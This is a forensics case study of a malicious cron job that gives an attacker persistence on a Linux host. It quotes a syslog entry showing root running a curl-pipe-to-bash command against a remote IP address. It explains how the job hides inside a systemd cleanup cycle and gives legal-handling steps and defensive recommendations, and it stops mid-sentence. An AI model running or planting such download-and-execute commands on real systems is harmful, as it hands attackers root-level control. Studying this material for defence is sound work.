# 🛡️ Case Study 02: Persistence via Cron — Malicious Scheduling Analysis

## 📝 Scenario Overview
During a deep-dive system audit, a critical persistence mechanism was identified. An attacker, having previously obtained root-level privileges, configured a malicious Cron job. This task was designed to automatically download and execute a remote script synchronized with the system's daily maintenance cycle, ensuring long-term unauthorized access while staying under the radar.

---

## 🛠️ Tech Stack & Tools
| Component | Details |
| :--- | :--- |
| **Analysis OS** | Linux (Forensics Analysis) |
| **Tools Used** | Cron, curl, bash, sha256sum |
| **Evidence Source** | /var/log/syslog |
| **Technique** | T1053.003 (Scheduled Task/Job: Cron) |

---

## 📑 2. Evidence (Raw Logs)
The following entries were identified in the system log on the target host:

> **Timestamp:** Feb 16 15:10:01  
> **Source:** systemd[1]  
> **Event:** Starting Daily Cleanup of Temporary Directories...
>
> **Timestamp:** Feb 16 15:10:05  
> **Source:** CRON[6002] (root)  
> **Command:** `curl -s http://193.124.1.50/script.sh | bash`
>
> **Timestamp:** Feb 16 15:10:06  
> **Source:** systemd[1]  
> **Event:** Finished Daily Cleanup of Temporary Directories.

---

## 🔍 Technical Analysis & Investigation

### **Phase 1: Detection of Persistence** 🕰️
A recurring task was detected running with root privileges, perfectly timed with legitimate system activities.
* **Analysis:** The attacker synchronized the malicious task with the `systemd` cleanup cycle.
* **Verdict:** This was a deliberate attempt to blend in with normal system "noise" and evade detection by basic monitoring tools that look for unusual execution times.

### **Phase 2: Payload Breakdown (Fileless Execution)** ⚡
Command analyzed: `curl -s http://193.124.1.50/script.sh | bash`
* **Analysis:** The command uses `curl -s` (silent mode) to download a script from a Command & Control (C2) server and immediately pipes it (`|`) into the Bash interpreter.
* **Verdict:** This is a **Fileless Execution** technique. Since the script is executed entirely in memory and never saved to the local disk, it effectively bypasses traditional signature-based Antivirus (AV) and File Integrity Monitoring (FIM).

### **Phase 3: Impact Assessment** ⚠️
* **Outcome:** As the task executes with root privileges, the attacker maintains absolute control over the OS.
* **Risk:** This level of access allows for credential harvesting, installation of kernel-level rootkits, or the deployment of ransomware.

---

## ⚖️ 4. Chain of Custody & Legal Perspective
In alignment with digital forensics best practices, the principle of **"minimal interaction"** was strictly maintained:
1.  **Imaging:** A bit-stream image of the affected partition and a full memory dump were secured prior to the eradication phase.
2.  **Integrity:** All digital evidence was cryptographically hashed using **SHA-256** to ensure its integrity and admissibility in potential legal proceedings.
3.  **Documentation:** Every step of the recovery was logged to maintain a verifiable audit trail.

---

## 📖 5. Security Recommendations

* **Monitor Cron Directories:** Implement automated alerts for any modifications to `/etc/cron.*` and `/var/spool/cron/crontabs`.
* **Restrict Egress Traffic:** Apply a "Default Den
